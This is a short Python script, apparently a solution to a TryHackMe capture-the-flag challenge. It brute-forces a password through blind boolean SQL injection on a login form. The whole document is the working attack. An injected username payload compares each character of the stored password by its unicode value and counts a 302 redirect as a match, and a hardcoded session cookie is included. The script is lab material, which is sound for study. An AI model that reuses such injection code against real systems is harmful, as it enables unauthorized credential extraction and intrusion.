import requests
import string
url = "http://10.10.2.152:5000/challenge3/login"
flag="THM{"
chars = string.ascii_letters+string.digits+'}'
counter = 5
while True:
    for char in chars:
        with requests.session() as sess:
            r = sess.post(url, data={
                "username":f"admin' and ((select unicode(substr(password,{counter},1)) from users limit 1)={ord(char)})--",
                "password":"tt"
            }, cookies={
                "session":".eJyNyL0OgjAQAOBnsfMNXA_UshkHGNTFvziR2l6hSjGhYEwI7-7u5PAt3yRMo9uWu5plNUbuK29FjvDbnQ4sctGb3e1abj9cnONGDSUVhwvoaOE4hsC9TFAtgNIskH-lzYPgVO4nd6c1Wse8QnbKEN4VLWWmbZYmRjk9w9s_fVejJBg4DoCI_xLzF_RfOSM.YnXRiw.pUd4Rh5eOfVVAhBqdtrDcKHGiqg"

            }, allow_redirects=False)
            if(r.status_code == 302):
                flag+=char
                counter+=1
                print(flag)
            if(char == "}"):
                break
